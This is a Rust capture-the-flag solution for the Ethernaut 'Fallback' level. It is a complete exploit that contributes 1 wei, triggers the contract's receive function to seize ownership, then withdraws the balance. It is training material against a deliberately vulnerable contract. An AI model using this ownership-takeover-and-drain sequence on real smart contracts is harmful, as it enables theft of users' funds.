use alloy::{primitives::U256, rpc::types::TransactionRequest};
use async_trait::async_trait;
use ctf::ethernaut::lvl01_fallback::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Fallback::new(target.address, offender);

        println!("Calling contribute()...");
        let receipt = contract
            .contribute()
            .value(U256::from(1))
            .send()
            .await?
            .get_receipt()
            .await?;
        println!("Contribute tx: {:?}", receipt.transaction_hash);

        println!("Calling receive()...");
        let tx = TransactionRequest::default()
            .to(contract.address())
            .value(U256::from(1));
        let receipt =
            offender.send_transaction(tx).await?.get_receipt().await?;
        println!("Receive tx: {:?}", receipt.transaction_hash);

        println!("Calling withdraw()...");
        let receipt = contract.withdraw().send().await?.get_receipt().await?;
        println!("Withdraw tx: {:?}", receipt.transaction_hash);

        Ok(())
    }
}
